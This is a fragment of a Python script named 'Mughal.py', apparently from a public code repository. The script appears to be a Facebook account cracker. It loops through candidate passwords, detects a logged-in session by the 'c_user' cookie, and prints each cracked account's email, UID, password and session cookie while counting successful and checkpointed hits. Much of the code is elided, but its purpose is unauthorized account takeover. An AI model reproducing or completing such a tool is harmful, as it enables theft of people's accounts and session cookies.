...
open-source/Mughal.py

@MUGHAL

MUGHAL Add files via upload
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('\r\033[1;32m[âˆš]---------------------[MUGHAL-OK]--------------------[âˆš]\nEMAIL : '+uid+'\nUID   : '+cid+' âˆš '+ps+ '\nCOOKIE   : '+coki+'\n[âˆš]---------------------------------------------------[âˆš]')
        ...
        sys.stdout.write(f'\r\33[1;37m[MUGHAL] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
